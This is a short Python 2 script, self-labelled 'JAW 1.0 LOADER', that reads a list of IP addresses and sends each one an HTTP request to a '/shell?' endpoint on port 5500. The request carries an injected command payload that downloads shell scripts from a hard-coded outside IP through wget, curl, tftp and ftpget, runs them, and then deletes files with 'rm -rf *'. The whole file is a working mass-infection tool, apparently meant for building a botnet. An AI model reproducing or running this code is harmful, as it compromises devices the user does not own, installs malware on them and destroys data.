#! python !# https://www.youtube.com/c/snoopyy
import threading, sys, time, requests
from threading import Thread
from time import sleep
from requests.auth import HTTPDigestAuth
from decimal import *	
ips = open(sys.argv[1], "r").readlines()

#RYRDM9/SNOOPY JAW 1.0 LOADER! 
payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.27.202.58/Black1.sh; curl -O http://103.27.202.58/Black1.sh; chmod 777 Black1.sh; sh Black1.sh; tftp 103.27.202.58 -c get OMNI-TFTP1.sh; chmod 777 OMNI-TFTP1.sh; sh OMNI-TFTP1.sh; tftp -r OMNI-TFTP2.sh -g 103.27.202.58; chmod 777 OMNI-TFTP2.sh; sh OMNI-TFTP2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.27.202.58 Black2.sh Black2.sh; sh Black2.sh; rm -rf Black1.sh OMNI-TFTP1.sh OMNI-TFTP2.sh Black2.sh; rm -rf *"
#port default 5500	
class jaw(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "\033[97m[Jaw\033[91m1.0\033[97m] Loading - " + self.ip
				url = "http://" + self.ip + ":5500/shell?" + payload + ""

				requests.get(url, timeout=3) 

			except Exception as e:
				pass
for ip in ips:
	try:
		r = jaw(ip)
		r.start()
		time.sleep(0.03)
	except:
		pass
